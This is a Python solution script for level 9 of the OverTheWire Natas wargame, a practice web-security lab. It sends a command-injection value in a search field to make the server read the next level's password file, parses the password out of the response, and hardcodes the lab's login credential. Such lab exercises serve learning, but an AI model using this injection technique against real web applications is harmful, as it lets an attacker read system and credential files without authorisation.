
#!/usr/bin/env python

import requests
import re

username = 'natas9'
password = 'ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t'

url = 'http://%s.natas.labs.overthewire.org/' % username

try:
    session = requests.Session()
    response = session.post(url, data={"needle": ". /etc/natas_webpass/natas10 #", "submit": "submit"}, auth=(username, password))

    content = response.text

    # Uncomment the line below to print the entire content of the response
    # print(content)

    # Using regular expression to find the password for natas10
    matches = re.findall(r'<pre>\n(.*)\n</pre>', content)

    if matches:
        password_natas10 = matches[0].strip()  # Strip any leading or trailing whitespace
        print("Password for natas10:", password_natas10)
    else:
        print("Password for natas10 not found in the response.")
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
